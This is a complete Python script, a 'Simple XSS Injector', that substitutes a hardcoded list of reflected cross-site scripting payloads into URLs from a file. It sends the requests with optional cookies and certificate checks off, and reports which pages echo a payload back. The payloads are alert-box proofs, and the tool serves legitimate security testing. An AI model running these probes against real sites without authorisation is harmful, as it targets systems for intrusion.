#!/usr/bin/env python3

import requests
import argparse
import urllib.parse
import sys

# XSS payload list
payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>'
]


def load_urls(file):
    try:
        with open(file, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[ERROR] Cannot read URL file: {e}")
        sys.exit(1)


def inject_payload(url, payload):
    encoded = urllib.parse.quote(payload)
    return url.replace("VALUE", encoded)


def parse_cookie(cookie_string):
    cookies = {}
    if not cookie_string:
        return cookies

    try:
        for c in cookie_string.split(";"):
            key, value = c.strip().split("=", 1)
            cookies[key] = value
    except:
        print("[ERROR] Invalid cookie format")
        sys.exit(1)

    return cookies


def is_reflected(payload, response_text):

    decoded = urllib.parse.unquote(payload)

    if payload in response_text:
        return True

    if decoded in response_text:
        return True

    return False


def main():

    parser = argparse.ArgumentParser(description="Simple XSS Injector")

    parser.add_argument("-u", "--urls", required=True, help="Input URLs file")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("--cookie", help="Cookie header")

    args = parser.parse_args()

    urls = load_urls(args.urls)
    cookies = parse_cookie(args.cookie)

    found = set()

    for url in urls:

        if "VALUE" not in url:
            print(f"[SKIP] VALUE placeholder missing -> {url}")
            continue

        for payload in payloads:

            target = inject_payload(url, payload)

            print(f"[+] Testing {target}")

            try:
                r = requests.get(
                    target,
                    cookies=cookies,
                    timeout=5,
                    verify=False
                )

                if is_reflected(payload, r.text):

                    print(f"[VULNERABLE] {target}")
                    found.add(target)

            except requests.exceptions.RequestException:
                print(f"[ERROR] Request failed -> {target}")

    print("\n========== RESULTS ==========")

    if found:
        for x in found:
            print(x)
    else:
        print("No reflections found.")

    if args.output:
        try:
            with open(args.output, "w") as f:
                for x in found:
                    f.write(x + "\n")
            print(f"\n[+] Results saved to {args.output}")
        except Exception as e:
            print(f"[ERROR] Cannot write output file: {e}")


if __name__ == "__main__":
    main()